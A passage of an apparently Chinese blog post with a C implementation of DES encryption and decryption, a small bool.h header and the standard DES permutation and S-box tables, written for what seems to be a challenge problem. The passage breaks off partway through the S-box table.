<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">LoopMove</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">256</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0</span>};
    BitsCopy(Temp,DatIn,Num);
    BitsCopy(DatIn,DatIn<span style="color:#f92672">+</span>Num,Len<span style="color:#f92672">-</span>Num);
    BitsCopy(DatIn<span style="color:#f92672">+</span>Len<span style="color:#f92672">-</span>Num,Temp,Num);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Xor</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatA,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatB,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
        DatA[i] <span style="color:#f92672">=</span> DatA[i] <span style="color:#f92672">^</span> DatB[i];
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">S_Change</span>(<span style="color:#66d9ef">bool</span> DatOut[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">48</span>]) {
    <span style="color:#66d9ef">int</span> i,X,Y;
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, Y <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, X <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>, DatIn <span style="color:#f92672">+=</span> <span style="color:#ae81ff">6</span>, DatOut <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>) {
        Y<span style="color:#f92672">=</span>(DatIn[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> DatIn[<span style="color:#ae81ff">5</span>];
        X<span style="color:#f92672">=</span>(DatIn[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> (DatIn[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> (DatIn[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> DatIn[<span style="color:#ae81ff">4</span>];
        <span style="color:#66d9ef">int</span> v9 <span style="color:#f92672">=</span> S_Box[i][Y][X];
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>; j <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; j<span style="color:#f92672">--</span>) {
            DatOut[j] <span style="color:#f92672">=</span> v9 <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>;
            v9 <span style="color:#f92672">/=</span> <span style="color:#ae81ff">2</span>;   
        }         
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">F_Change</span>(<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatKi[<span style="color:#ae81ff">48</span>]) {
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> MiR[<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0</span>};
    TablePermute(MiR,DatIn,E_Table,<span style="color:#ae81ff">48</span>);
    Xor(MiR,DatKi,<span style="color:#ae81ff">48</span>);
    S_Change(DatIn,MiR);
    TablePermute(DatIn,DatIn,P_Table,<span style="color:#ae81ff">32</span>);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SetKey</span>(<span style="color:#66d9ef">char</span> KeyIn[<span style="color:#ae81ff">8</span>]) {
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> KeyBit[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>KiL <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>KeyBit[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>KiR <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>KeyBit[<span style="color:#ae81ff">28</span>];
    ByteToBit(KeyBit, KeyIn, <span style="color:#ae81ff">64</span>);
    TablePermute(KeyBit, KeyBit, PC1_Table, <span style="color:#ae81ff">56</span>);
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
        LoopMove(KiL, <span style="color:#ae81ff">28</span>, Move_Table[i]);
        LoopMove(KiR, <span style="color:#ae81ff">28</span>, Move_Table[i]);
        TablePermute(SubKey[i], KeyBit, PC2_Table, <span style="color:#ae81ff">48</span>); 
    }        
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">PlayDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]) {
    <span style="color:#66d9ef">int</span> i;
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> MesBit[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>MiL <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>MiR <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">32</span>];
    ByteToBit(MesBit, MesIn, <span style="color:#ae81ff">64</span>);
    TablePermute(MesBit, MesBit, IP_Table, <span style="color:#ae81ff">64</span>);
    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
        printf(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[i]);
    }
    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
        BitsCopy(Temp, MiR, <span style="color:#ae81ff">32</span>);
        F_Change(MiR, SubKey[i]);
        Xor(MiR, MiL, <span style="color:#ae81ff">32</span>);
        BitsCopy(MiL, Temp, <span style="color:#ae81ff">32</span>);
        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; j<span style="color:#f92672">++</span>){
            printf(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[j]);
        }
        printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> MesBit[i];
        MesBit[i] <span style="color:#f92672">=</span> MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>];
        MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> tmp;
    }
    TablePermute(MesBit, MesBit, IPR_Table, <span style="color:#ae81ff">64</span>);
    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>){
        printf(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[i]);
    }
    BitToHex(MesOut,MesBit,<span style="color:#ae81ff">64</span>);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">KickDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]) {
    <span style="color:#66d9ef">int</span> i;
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> MesBit[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>MiL <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>MiR <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">32</span>];
    HexToBit(MesBit, MesIn, <span style="color:#ae81ff">64</span>);
    TablePermute(MesBit, MesBit, IP_Table, <span style="color:#ae81ff">64</span>);
    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> MesBit[i];
        MesBit[i] <span style="color:#f92672">=</span> MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>];
        MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> tmp;
    }
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>; i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; i<span style="color:#f92672">--</span>) {
        BitsCopy(Temp, MiL, <span style="color:#ae81ff">32</span>);
        F_Change(MiL, SubKey[i]);
        Xor(MiL, MiR, <span style="color:#ae81ff">32</span>);
        BitsCopy(MiR, Temp, <span style="color:#ae81ff">32</span>);
    }    
    TablePermute(MesBit, MesBit, IPR_Table, <span style="color:#ae81ff">64</span>);
    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>){
        printf(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[i]);
    }
    BitToByte(MesOut, MesBit, <span style="color:#ae81ff">64</span>);        
}
</code></pre></div><p>bool.h，我的评价是不如直接上 c++</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#ifndef __BOOL_H__
</span><span style="color:#75715e">#define __BOOL_H__
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">enum</span>
  {
    false <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
    true  <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
  } <span style="color:#66d9ef">bool</span>;

<span style="color:#75715e">#endif
</span></code></pre></div><p>tables.h，之前找到的文件有几处与题目中不同，不知道是作者写错了还是题目改数了，直接把算好的 subkey 填到这里，就不用再输入密钥算了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#ifndef _TABLES_H_
</span><span style="color:#75715e">#define _TABLES_H_  
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> IP_Table[<span style="color:#ae81ff">64</span>]<span style="color:#f92672">=</span>{             
	<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">36</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>,
	<span style="color:#ae81ff">62</span>,<span style="color:#ae81ff">54</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">38</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">8</span>,
	<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">35</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>,
	<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">7</span> 
};

<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> IPR_Table[<span style="color:#ae81ff">64</span>]<span style="color:#f92672">=</span>{              
	<span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">31</span>,
	<span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">54</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">62</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">29</span>,
	<span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">27</span>,
	<span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">25</span>	
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> E_Table[<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{
	<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>,
	 <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">17</span>,
    <span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">25</span>,
    <span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">1</span>
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> PC1_Table[<span style="color:#ae81ff">56</span>]<span style="color:#f92672">=</span>{
	<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">18</span>,
	<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">35</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">36</span>,
	<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">62</span>,<span style="color:#ae81ff">54</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">38</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">22</span>,
	<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> Move_Table[<span style="color:#ae81ff">16</span>]<span style="color:#f92672">=</span>{
	 <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> PC2_Table[<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{
	<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">10</span>,
	<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>,
	<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">48</span>,
	<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">36</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">32</span>	
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> S_Box[<span style="color:#ae81ff">8</span>][<span style="color:#ae81ff">4</span>][<span style="color:#ae81ff">16</span>]<span style="color:#f92672">=</span>{
	<span style="color:#75715e">//S1
</span><span style="color:#75715e"></span>	<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>,
	 <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>,
	 <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">13</span>,
	<span style="color:#75715e">//S2
</span><span style="color:#75715e"></span>	<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">10</span>,
	 <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>,
	 <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">15</span>,
	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>,
	<span style="color:#75715e">//S3
